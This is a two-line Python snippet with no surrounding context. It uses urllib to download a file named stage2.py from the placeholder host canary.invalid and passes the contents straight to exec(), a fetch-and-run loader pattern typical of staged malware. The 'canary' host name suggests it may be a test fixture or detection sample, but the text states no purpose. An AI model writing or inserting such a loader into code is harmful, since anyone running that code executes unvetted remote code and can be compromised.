import urllib.request

exec(urllib.request.urlopen("https://canary.invalid/stage2.py").read())
